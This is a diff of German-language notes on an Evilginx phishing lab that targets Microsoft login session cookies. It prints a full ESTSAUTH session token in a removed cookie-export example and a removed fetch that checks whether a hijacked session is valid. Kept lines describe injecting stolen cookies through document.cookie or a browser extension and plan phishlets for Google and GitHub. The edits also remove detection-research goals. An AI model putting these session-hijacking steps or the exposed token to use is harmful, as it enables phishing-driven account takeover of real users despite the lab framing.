@@ -142,29 +142,7 @@ echo "127.0.0.1 account.lab.test" | sudo tee -a /etc/hosts
    - Session Cookies werden von Evilginx erfasst
 
 3. Cookie Export validieren
-   - Cookies im JSON-Format exportieren
    - Struktur und Inhalte prüfen
-
-### Cookie Export Beispiel
-```bash
-# Cookies einer Test-Session exportieren
-sessions <session_id> cookies
-
-# Exportiertes Format:
-[
-  {
-    "name": "ESTSAUTH",
-    "value": "1.AQwAIhJTvxD99kiso_dDohxwoVtEZUfGMrBJg-Ydk3ZSdsqWAFQMAA.AgABFwQAAABlMNzVhAPUTrARzfQjWPtKAwDs_wUA9P_uWTFYfTd6zPacfXrLQ5Z2Ql-LCljUq6FulGespSoQKe6IJCg1xSn-gU2MIMZztf_0tcUshjnof2R4rdC5dga47TfbhILdgWmfXTn35JbE8CXhkN9JXmNglVDPDl3d76QGE9BVGyPXrv5vsTbG__o7v8rnm__LrZ-Lhi51CMIoIuJ3rBQgmBGyyh6r8ZnT8nG2ExWReguVgKeUqDgtQcrI8R76iUvh7_mcxVpYBrsPuCTaoAmSuH9MApTzYTkl2Q1J77qhN09GNvge1JRlMkEyNjbcmy07ccNpJbd0mbRhnEo1zccDJ-tPdPGZ9s6yyR3RIoVBxRZOwbeEt9_3902G0Dl2ymPNtBjT0NfItgdwKU-lrXrK_W76aC_juBhYHXSDawoMjaslID0JYBJ8b2ELzXV1KlbTahkl_EvxiB_pEZlAI5B4hbWLNMILNLFr3_1NfK12pOXWhkEMrcGXv1CSlYV2yjRx7XvMjYk_zYUIsHOtCqaShKkXU9YneY-ofaaTJYFndLJK8cmS2g4iTZyA4scSVhOdEyN0fZlppjMeh3crCNhoGzHpcBKVXuX5-Z4nc-TCCvA2OQkKNPfzuvVNv2FKfAkgPZplkKl6Hh0PWJsnrWf5j4bln254J3-6Qms4QNvpRld3bwEAzySi2tOeBLAbs9pIXZGPiz9vBuYZuYXzikJEA-VeJElTRjxGFkODJ0kqtE5kzsGWKPU-ZyfBt_qsUw",
-    "domain": ".login.microsoftonline.com",
-    "path": "/",
-    "expirationDate": 1792046014,
-    "httpOnly": true,
-    "hostOnly": false,
-    "secure": true,
-    "session": false
-  }
-]
-```
 
 ## Session Hijacking Forschung
 
@@ -179,8 +157,8 @@ document.cookie = "ESTSAUTH=...; domain=.login.microsoftonline.com"
 ### Erfolgreicher Workaround
 1. Browser Extension Methode
    - "Cookie-Editor" Extension installieren
-   - JSON-formatted Cookies importieren
-
+   - Immer inkognito fenster nutzen und sich immer abmelden
+  
 2. Vorbereitungsschritte
    ```bash
    # Bestehende Cookies löschen
@@ -195,20 +173,6 @@ document.cookie = "ESTSAUTH=...; domain=.login.microsoftonline.com"
    - Cookies importieren
    - Seite neu laden
 
-### Session Validierung
-```javascript
-// Session Gültigkeit testen
-fetch('https://graph.microsoft.com/v1.0/me', {
-  credentials: 'include'
-})
-.then(response => {
-  if(response.ok) {
-    console.log('Session ist gültig');
-  } else {
-    console.log('Session ist ungültig');
-  }
-});
-```
 
 ## Bisherige technische Erkenntnisse
 
@@ -241,8 +205,6 @@ fetch('https://graph.microsoft.com/v1.0/me', {
 ```bash
 # Isolierte Laborumgebung
 # Keine Produktivdaten
-# Automatische Datenbereinigung
-# Regelmäßige Snapshots
 ```
 
 ### Ethische Richtlinien
@@ -253,22 +215,14 @@ fetch('https://graph.microsoft.com/v1.0/me', {
 
 ## Nächste Schritte im Projekt
 
-### Phase 3: Erweiterte Testing (Aktuell)
-- Cookie Lifetime Analysis
-- Session Validation Tests
-- Multiple Browser Testing
-- Security Header Analysis
-
 ### Phase 4: Zukünftige Entwicklung
 - Weitere Phishlets entwickeln (Google, GitHub)
 - Automatisierte Testing Pipeline
-- Detektion Mechanismen Forschung
 - Defense Techniques Entwicklung
 
 ### Technische Forschungsfragen
 1. Wie können Session Cookies besser geschützt werden?
-2. Welche Detection Mechanisms sind effektiv?
-3. Wie kann Awareness training verbessert werden?
+2. Wie kann Awareness training verbessert werden?
 
 ## Dokumentation der Testfälle
 
